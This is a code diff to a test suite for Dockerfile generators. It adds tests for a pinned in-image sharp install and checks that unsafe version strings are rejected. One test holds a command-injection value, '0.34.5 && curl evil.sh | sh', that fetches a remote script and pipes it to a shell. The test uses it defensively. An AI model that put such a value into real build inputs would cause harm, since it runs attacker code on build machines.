@@ -35,9 +35,9 @@ describe("emitted base image is Node >= 24 (inline (?i:) regex support)", () => 
     expect(() =>
       generateDockerfile({ containerStrategy: "shared-image", nodeVersion: "22", buildId: "b" }),
     ).toThrow(/Node 24/);
-    expect(() => generatePoolDockerfile({ poolName: "ssr", nodeVersion: "23", buildId: "b" })).toThrow(
-      /inline regexp modifiers/,
-    );
+    expect(() =>
+      generatePoolDockerfile({ poolName: "ssr", nodeVersion: "23", buildId: "b" }),
+    ).toThrow(/inline regexp modifiers/);
     expect(() => generateRoutingServiceDockerfile({ nodeVersion: "junk", buildId: "b" })).toThrow(
       /Unsupported emitted base image/,
     );
@@ -55,6 +55,33 @@ describe("generateDockerfile", () => {
     expect(result).toContain("COPY --chown=node:node . .");
     expect(result).toContain("NEXT_BUILD_ID=abc123");
     expect(result).toContain('CMD ["node", "pool-server.cjs"]');
+  });
+
+  // N50 (review #30): the shared-image strategy copies the app's whole node_modules, which
+  // holds the BUILD HOST's @img/* platform packages — not linux-x64 — so it needs the same
+  // in-image sharp install escape hatch the pool Dockerfile has. Without it, /_next/image
+  // 503s ("sharp is unavailable") from a shared image built on a non-linux-x64 host.
+  it("emits a pinned in-image sharp install when installSharpVersion is set", () => {
+    const result = generateDockerfile({
+      containerStrategy: "shared-image",
+      buildId: "abc123",
+      installSharpVersion: "0.34.5",
+    });
+    expect(result).toContain("RUN npm install --no-save --no-audit --no-fund sharp@0.34.5");
+    expect(result.indexOf("COPY --chown=node:node . .")).toBeLessThan(
+      result.indexOf("RUN npm install"),
+    );
+    expect(result.indexOf("RUN npm install")).toBeLessThan(result.indexOf("USER node"));
+  });
+
+  it("rejects an unsafe sharp version (Dockerfile RUN injection)", () => {
+    expect(() =>
+      generateDockerfile({
+        containerStrategy: "shared-image",
+        buildId: "abc123",
+        installSharpVersion: "0.34.5 && curl evil.sh | sh",
+      }),
+    ).toThrow(/Unsafe sharp version/);
   });
 
   it("runs as the non-root node user with node-owned app files", () => {
